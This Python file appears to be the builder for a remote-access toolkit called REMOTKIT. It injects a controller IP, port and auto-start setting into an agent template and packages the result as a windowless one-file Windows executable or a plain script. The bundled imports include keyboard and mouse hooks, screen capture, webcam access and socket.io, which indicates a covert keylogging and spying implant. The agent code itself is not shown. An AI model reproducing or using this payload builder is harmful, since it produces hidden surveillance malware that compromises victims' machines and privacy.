#!/usr/bin/env python3
"""
REMOTKIT - Builder Module for PyInstaller
"""

import os
import sys
import subprocess
import tempfile
import shutil
import time
from pathlib import Path

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
AGENT_FILE = os.path.join(BASE_DIR, "agent.py")
DOWNLOAD_FOLDER = os.path.join(BASE_DIR, "downloads")


def check_pyinstaller():
    try:
        result = subprocess.run(
            ["pyinstaller", "--version"],
            capture_output=True,
            text=True,
            shell=(sys.platform == "win32")
        )
        return result.returncode == 0
    except FileNotFoundError:
        return False


def install_pyinstaller():
    print("[*] Installing PyInstaller...")
    try:
        subprocess.run(
            [sys.executable, "-m", "pip", "install", "pyinstaller"],
            check=True,
            capture_output=True
        )
        return True
    except subprocess.CalledProcessError:
        return False


def prepare_agent_code(server_ip, server_port, os_type, auto_start, client_id):
    with open(AGENT_FILE, 'r', encoding='utf-8') as f:
        code = f.read()
    
    code = code.replace('{{SERVER_IP}}', server_ip)
    code = code.replace('{{SERVER_PORT}}', str(server_port))
    code = code.replace('{{CLIENT_ID}}', client_id)
    code = code.replace('{{OS_TYPE}}', os_type)
    code = code.replace('{{AUTO_START}}', 'True' if auto_start else 'False')
    
    return code


def build_exe(server_ip, server_port, os_type, auto_start, client_id, output_name="agent"):
    """
    Build agent menjadi .exe menggunakan PyInstaller
    Timeout: 300 detik (5 menit)
    """
    
    if not check_pyinstaller():
        print("[!] PyInstaller not found, installing...")
        if not install_pyinstaller():
            return False, None, "PyInstaller installation failed. Run: pip install pyinstaller"
    
    os.makedirs(DOWNLOAD_FOLDER, exist_ok=True)
    
    temp_dir = tempfile.mkdtemp(prefix="remotkit_build_")
    temp_agent = os.path.join(temp_dir, "agent.py")
    
    code = prepare_agent_code(server_ip, server_port, os_type, auto_start, client_id)
    
    with open(temp_agent, 'w', encoding='utf-8') as f:
        f.write(code)
    
    output_exe = f"{output_name}.exe"
    output_path = os.path.join(DOWNLOAD_FOLDER, output_exe)
    
    build_cmd = [
        "pyinstaller",
        "--onefile",
        "--noconsole",
        "--clean",
        "--name", output_name,
        "--distpath", DOWNLOAD_FOLDER,
        "--workpath", os.path.join(temp_dir, "build"),
        "--specpath", temp_dir,
        "--add-data", f"{temp_agent}{os.pathsep}.",
        temp_agent
    ]
    
    hidden_imports = [
        "socketio", "engineio", "engineio.async_drivers.threading",
        "PIL", "PIL.Image", "pyautogui", "pynput", "pynput.keyboard",
        "pynput.mouse", "cv2", "numpy"
    ]
    
    for hi in hidden_imports:
        build_cmd.extend(["--hidden-import", hi])
    
    print(f"[+] Building EXE for {server_ip}:{server_port}")
    print(f"[+] Output: {output_path}")
    
    try:
        result = subprocess.run(
            build_cmd,
            capture_output=True,
            text=True,
            cwd=temp_dir,
            shell=(sys.platform == "win32"),
            timeout=300  # 5 MENIT (diperbaiki dari 120 detik)
        )
        
        if result.returncode != 0:
            error_msg = result.stderr if result.stderr else result.stdout
            return False, None, f"PyInstaller error: {error_msg[:500]}"
        
        if os.path.exists(output_path) and os.path.getsize(output_path) > 0:
            file_size = os.path.getsize(output_path)
            print(f"[+] Build success! Size: {file_size / 1024 / 1024:.2f} MB")
            return True, output_path, None
        else:
            return False, None, "Output file not found or empty"
            
    except subprocess.TimeoutExpired:
        return False, None, "Build timeout (exceeded 300 seconds) - Try again or check system resources"
    except Exception as e:
        return False, None, str(e)
    finally:
        try:
            shutil.rmtree(temp_dir, ignore_errors=True)
        except:
            pass


def build_script(server_ip, server_port, os_type, auto_start, client_id, output_name="agent", output_type="py"):
    """
    Build script biasa (.py) untuk Linux/Android
    """
    os.makedirs(DOWNLOAD_FOLDER, exist_ok=True)
    
    code = prepare_agent_code(server_ip, server_port, os_type, auto_start, client_id)
    
    filename = f"{output_name}.py"
    filepath = os.path.join(DOWNLOAD_FOLDER, filename)
    
    with open(filepath, 'w', encoding='utf-8') as f:
        f.write(code)
    
    return True, filepath, None


def cleanup_downloads(max_age_seconds=3600):
    now = time.time()
    deleted = 0
    
    if not os.path.exists(DOWNLOAD_FOLDER):
        return 0
    
    for filename in os.listdir(DOWNLOAD_FOLDER):
        filepath = os.path.join(DOWNLOAD_FOLDER, filename)
        if os.path.isfile(filepath):
            file_age = now - os.path.getmtime(filepath)
            if file_age > max_age_seconds:
                try:
                    os.remove(filepath)
                    deleted += 1
                except:
                    pass
    
    if deleted > 0:
        print(f"[+] Cleaned up {deleted} old files from downloads/")
    
    return deleted


# ========== MAIN (Testing) ==========
if __name__ == "__main__":
    # Test build
    import uuid
    test_id = str(uuid.uuid4())[:8]
    
    print("Testing PyInstaller build...")
    success, path, error = build_exe(
        server_ip="127.0.0.1",
        server_port=5000,
        os_type="windows",
        auto_start=False,
        client_id=test_id,
        output_name="test_agent"
    )
    
    if success:
        print(f"✅ Build successful: {path}")
    else:
        print(f"❌ Build failed: {error}")